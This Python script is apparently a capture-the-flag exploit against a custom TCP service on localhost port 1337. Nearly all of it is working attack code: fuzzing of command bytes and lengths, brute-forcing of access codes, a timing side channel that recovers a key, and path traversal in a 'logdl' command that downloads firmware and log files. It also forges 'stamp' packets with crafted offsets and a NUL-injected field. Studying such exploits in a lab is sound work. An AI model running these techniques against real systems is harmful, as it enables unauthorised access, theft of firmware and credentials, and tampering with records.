#!/usr/bin/env python

import socket
import struct
import time
from itertools import product

TCP_IP = '127.0.0.1'
TCP_PORT = 1337
BUFFER_SIZE = 1024
MESSAGE = "a"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TCP_IP, TCP_PORT))
def send_pkt(cmd):
    s.send(cmd)
    pkt = ""
    size=0
    lenght = 6
    # read header
    while size < lenght:
        data = s.recv(BUFFER_SIZE)
        pkt +=data
        size += len(data)
    lenght = struct.unpack(">I", pkt[2:6])[0]
    while size < lenght:
        data = s.recv(BUFFER_SIZE)
        size += len(data)
        pkt += data
    return pkt

def send_pkt_time(cmd):
    start_time = time.time()
    s.send(cmd)
    pkt = ""
    size=0
    lenght = 6
    # read header
    while size < lenght:
        data = s.recv(BUFFER_SIZE)
        pkt +=data
        size += len(data)
    end_time = time.time()
    ex_time = round((end_time-start_time) * 10000,3)
    if ex_time > 6000:
        print("time : ", ex_time)
        print("byte: %s' -> len(%d) data: %r" % (cmd, len(pkt), pkt))
    lenght = struct.unpack(">B", pkt[5])[0]
    while size < lenght:
        data = s.recv(BUFFER_SIZE)
        size += len(data)
        pkt += data
    return pkt

def find_cmd_lenght(cmd):
    for i in range(256):
        pkt = chr(cmd) + i * "A"
        pkt = send_pkt(pkt)
        if not "BAD" in pkt:
            print("byte: %d'0x%02x' -> len(%d) data: %r" % (i, i, len(pkt), pkt))

def find_cmd_lenght2(cmd):
    for i in range(256):
        pkt = chr(cmd) + i * "A"
        pkt = send_pkt(pkt)
        if not "not found" in pkt:
            print("byte: %d'0x%02x' -> len(%d) data: %r" % (i, i, len(pkt), pkt))

#find_cmd_lenght(0x1)
#find_cmd_lenght(0x25)
#find_cmd_lenght(0xac)

def find_cmd_params(cmd, leng):
    lower_a = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']
    upper_a = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
    num = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9']

    all = []
    all = upper_a
    tt_l= 1
    for i in range(leng):
        tt_l = tt_l * len(all)

    i=0
    f=0
    for s in product(all, repeat=leng):
        sd = chr(cmd) + ''.join(s)

        pkt = send_pkt(sd)

        i+=1
        f+=1
        if f == 10000:
            print"%d/%d" % (i, tt_l)
            f=0
        if not ("ACCESS DENIED" in pkt or ''.join(s) in pkt):
            print("byte: %s' -> len(%d) data: %r" % (sd, len(pkt), pkt))

def find_cmd_params2(cmd, leng,tt):
    upper_a = ['A', 'B', 'C', 'D', 'E', 'F']
    num = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9']
    all = upper_a + num
    send_pkt(chr(cmd) + "a" + 7 * "A")
    tt_time = 0
    for i in all :
        ex_time = 0
        for r in range(tt):
            sd = chr(cmd) + "0338D348" + i + 0 * "A"
            start_time = time.time()
            pkt = send_pkt(sd)
            end_time = time.time()
            ex_time = ex_time + round((end_time-start_time) * 10000,3)
        ex_time = ex_time/tt
        if ex_time > tt_time:
            tt_time = ex_time
            print("time : ", ex_time)
            print("byte: %s' -> len(%d) data: %r" % (i, len(pkt), pkt))
        if not ("ACCESS DENIED" in pkt):
            print("byte: %s' -> len(%d) data: %r" % (sd, len(pkt), pkt))


def find_cmd_shell(cmd):
    for a in range(26):
        for b in range(26):
            pkt = chr(cmd) + chr(97+a) + chr(97+b)
            pkt = send_pkt(pkt)
            if not "not found" in pkt:
                print("byte: %d'0x%02x' -> len(%d) data: %r" % (a, b, len(pkt), pkt))

def exec_key():
    sd = chr(0x25) + "0338D348"
    pkt = send_pkt(sd)
    print("byte: %d'0x%02x' -> len(%d) data: %r" % (0,0, len(pkt), pkt))

def change_disk(disk):
    sd = chr(0x40) + chr(0x14) +chr(0x53)+chr(0x7a)+chr(0x40)+chr(disk)
    pkt = send_pkt(sd)
    print("byte: %d'0x%02x' -> len(%d) data: %r" % (0,0, len(pkt), pkt))

def show_files_w_disk(path):
    sd = chr(0x2a) + "ls "+path
    pkt = send_pkt(sd)
    print("byte: %d'0x%02x' -> len(%d) data: %r" % (0,0, len(pkt), pkt))

def show_help():
    sd = chr(0x2a) + "help"
    pkt = send_pkt(sd)
    print("byte: %d'0x%02x' -> len(%d) data: %r" % (0,0, len(pkt), pkt))

def show_files(disk,path):
    change_disk(disk)
    sd = chr(0x2a) + "ls "+path
    pkt = send_pkt(sd)
    print("byte: %d'0x%02x' -> len(%d) data: %r" % (0,0, len(pkt), pkt))

def print_file(disk,path):
    change_disk(disk)
    sd = path
    pkt = send_pkt(sd)
    print("byte: %d'0x%02x' -> len(%d) data: %r" % (0,0, len(pkt), pkt))

def dl_file_w_disk(path, name):
    sd = path
    pkt = send_pkt(sd)
    print("byte: %d'0x%02x' -> len(%d) data: %r" % (0,0, len(pkt), pkt))
    with open(name,'w') as f:
        f.write(pkt[6:])
    f.close()

def dl_file(disk,path, name):
    change_disk(disk)
    sd = path
    pkt = send_pkt(sd)
    print("byte: %d'0x%02x' -> len(%d) data: %r" % (0,0, len(pkt), pkt))
    with open(name,'w') as f:
        f.write(pkt[6:])
    f.close()

def exec_cmd(cmd, params):
    sd = chr(cmd) + params
    pkt = send_pkt(sd)
    print("byte: %d'0x%02x' -> len(%d) data: %r" % (0,0, len(pkt), pkt))
#find_cmd_shell(0x2a)
#sd = chr(0x2a) + "pragma"
#sd = chr(0x2a) + "help"
#sd = chr(0x2a) + "logdl ../FW/PART3.ELF"
#sd = chr(0x2a) + "logdl ../LOG/101732"
#sd = chr(0x2a) + "logdl "+"../FW"+ "./"*51+"../FW/PART3.ELF"
#

#pkt = send_pkt(sd)

#with open('part3.elf','w') as f:
#    f.write(pkt[6:])
#f.close()

# Change disk : last bit is disk
# sd = chr(0x40) + chr(0x14) +chr(0x53)+chr(0x7a)+chr(0x40)+chr(0x02)
# #
# pkt = send_pkt(sd)
# print("byte: %d'0x%02x' -> len(%d) data: %r" % (0,0, len(pkt), pkt))
#
# sd = chr(0x2a) + "logdl "+"../FW"+ "./"*51+"../FW/PART2.ELF"
# pkt = send_pkt(sd)
# print("byte: %d'0x%02x' -> len(%d) data: %r" % (0,0, len(pkt), pkt))
# with open('part2.elf','w') as f:
#     f.write(pkt[6:])
# #f.close()

#sd = chr(0x40) + chr(0x14) +chr(0x53)+chr(0x7a)+chr(0x40)+chr(0x02)
#pkt = send_pkt(sd)
#sd = chr(0x2a) + "ls LOG/STAMP/"
#pkt = send_pkt(sd)
#print("byte: %d'0x%02x' -> len(%d) data: %r" % (0,0, len(pkt), pkt))

#sd = chr(0x2a) + "logdl "+"../FW"+ "./"*48+"../LOG/STAMP/LAST.TXT"
#pkt = send_pkt(sd)
#print("byte: %d'0x%02x' -> len(%d) data: %r" % (0,0, len(pkt), pkt))
#with open('LAST.txt','w') as f:
#     f.write(pkt[6:])
#f.close()

#CLEAN !!
def tmp():
    exec_key()
    print("disk 1 CONF\n")
    show_files(0x01,"CONF")

    print("disk 1 FW\n")
    show_files(0x01,"FW")

    print("disk 1 LOG\n")
    show_files(0x01,"LOG")

    print("disk 2 CONF\n")
    show_files(0x02,"CONF")

    print("disk 2 FW\n")
    show_files(0x02,"FW")

    print("disk 2 LOG\n")
    show_files(0x02,"LOG")

    print("disk 2 LOG/STAMP\n")
    show_files(0x02,"LOG/STAMP")

    print("disk 2 LOG/STAMP/LAST.TXT\n")
    print_file(0x02, chr(0x2a) + "logdl "+"../FW"+ "./"*48+"../LOG/STAMP/LAST.TXT")

#stamp_key = "D37AE50F"
#exec_cmd(0xac,stamp_key)
#print("disk 2 LOG/STAMP/LAST.TXT\n")
#print_file(0x02, chr(0x2a) + "logdl "+"../FW"+ "./"*48+"../LOG/STAMP/LAST.TXT")
#j=120
#for i in range(129):
#    stamp_key = i * chr(0x00)+ "D37AE50F" + j * chr(0x00)
#    exec_cmd(0xac,stamp_key)
#    j -=1
## STAMP KEY

def stamp_cmd(group,epoch):
    stamp_header_off_i= chr(0X00) * 3 + chr(0x0C)
    stamp_header_off_k= chr(0X00) * 1 + chr(0x00) + chr(0x00) + chr(0x0C) # offk+8 > 1 00 00
    stamp_header_off_o = chr(0X00) * 1 +chr(0x00) + chr(0x00) + chr(0x4D)
    stamp_key = "D37AE50F"
    stamp = stamp_header_off_i + stamp_header_off_k + stamp_header_off_o + stamp_key + group + epoch+(108 - len(group) - len(epoch)) * chr(0x00)
    exec_cmd(0xac,stamp)
    #print_file(0x02, chr(0x2a) + "logdl "+"../FW"+ "./"*48+"../LOG/STAMP/LAST.TXT")

def stamp_cmd_key(group,epoch):
    stamp_header_off_i= chr(0X00) * 3 + chr(0x0C)
    stamp_header_off_k= chr(0X00) * 1 + chr(0x00) + chr(0x00) + chr(0x0C) # offk+8 > 1 00 00
    stamp_header_off_o = chr(0X6F) * 1 +chr(0xDD) + chr(0xE0) + chr(0x88)
    stamp_key = "D37AE50F"
    stamp = stamp_header_off_i + stamp_header_off_k + stamp_header_off_o + stamp_key + group + epoch+(108 - len(group) - len(epoch)) * chr(0x00)
    exec_cmd(0xac,stamp)
    #print_file(0x02, chr(0x2a) + "logdl "+"../FW"+ "./"*48+"../LOG/STAMP/LAST.TXT")


#stamp_cmd("group=user","epoch=22")
#stamp_cmd("epoch=22group=user\0","")


stamp_cmd_key("epoch=22group=user\0","")
#show_files_w_disk("/LOG")
#sd = chr(0x2a) + "logdl "+"../FW/"+ "./"*50+"../FW/KERNEL.ELF"
#dl_file_w_disk(sd,"KERNEL.ELF")
#stamp_cmd("group=user\0\n")

